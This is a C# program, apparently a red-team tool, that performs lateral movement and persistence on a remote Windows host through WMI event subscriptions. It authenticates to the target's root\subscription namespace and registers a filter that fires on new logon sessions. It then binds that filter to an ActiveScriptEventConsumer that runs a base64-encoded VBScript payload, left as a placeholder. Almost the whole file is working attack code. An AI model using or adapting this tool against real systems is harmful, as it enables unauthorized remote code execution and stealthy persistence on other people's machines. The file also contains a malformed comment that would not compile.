using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management;

namespace wmisubscription_lateralmovement
{
    class Program
    {
        static void Main(string[] args)
        {
            string vbscript64 = "<INSIDE base64 encoded VBS here>";
            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));

            // Connect to remote endpoint for WMI management
            string NAMESPACE = @"\\IP\root\subscription";

            ConnectionOptions cOption = new ConnectionOptions();
            ManagementScope scope = null;
            scope = new ManagementScope(NAMESPACE, cOption);
            
            scope.Options.Username = "username";
            scope.Options.Password = "password";
            scope.Options.Authority = string.Format("ntlmdomain:{0}", ".");
            
            scope.Options.EnablePrivileges = true;
            scope.Options.Authentication = AuthenticationLevel.PacketPrivacy;
            scope.Options.Impersonation = ImpersonationLevel.Impersonate;
            scope.Connect();

            // Create WMI event filter
            ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);

            string query = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'"; \\ monitor the Win32_LogonSession class and then just simply trigger a second authentication
            WqlEventQuery myEventQuery = new WqlEventQuery(query);
            ManagementObject myEventFilter = wmiEventFilter.CreateInstance(); 
            myEventFilter["Name"] = "filtername";
            myEventFilter["Query"] = myEventQuery.QueryString;
            myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
            myEventFilter["EventNameSpace"] = @"\\root\cimv2";
            myEventFilter.Put();

            // Create WMI event consumer
            
            ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();
            myEventConsumer["Name"] = "scriptname";
            myEventConsumer["ScriptingEngine"] = "VBScript";
            myEventConsumer["ScriptText"] = vbscript;
            myEventConsumer.Put();

            // Bind filter and consumer
            ManagementObject  myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
            myBinder["Filter"] = myEventFilter.Path.RelativePath;
            myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
            myBinder.Put();

            // Cleanup/delete
            // myEventFilter.Delete();
            // myEventConsumer.Delete();
            // myBinder.Delete();

        }
    }
}
